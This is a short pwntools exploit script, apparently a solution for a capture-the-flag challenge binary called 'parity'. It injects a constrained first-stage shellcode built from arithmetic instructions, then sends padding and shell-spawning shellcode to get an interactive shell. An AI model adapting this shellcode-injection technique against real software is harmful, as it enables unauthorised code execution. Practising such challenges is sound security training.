#!/usr/bin/env python3

from pwn import *

exe = ELF('./parity')
# libc = ELF('')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *0x40128A
b *0x4012F5
'''

p = process('./parity')
#p = gdb.debug('./parity', gdbscript = script)
#debug()

shellc = asm('''
xor rax, 0x3f
inc rax
cdq
shl rax, 7
shl rax, 1
cdq
xor rax, 9
add rax, 7
shl rax, 7
shl rax, 1
cdq
xor rax, 0x7f
add rax, 0x75
xor rdx, 0x7f
nop
call rax
''')
s(shellc)

sleep(3)

payload = b"A" * 0x2f # padding
payload += asm(shellcraft.sh())
s(payload)

p.interactive()
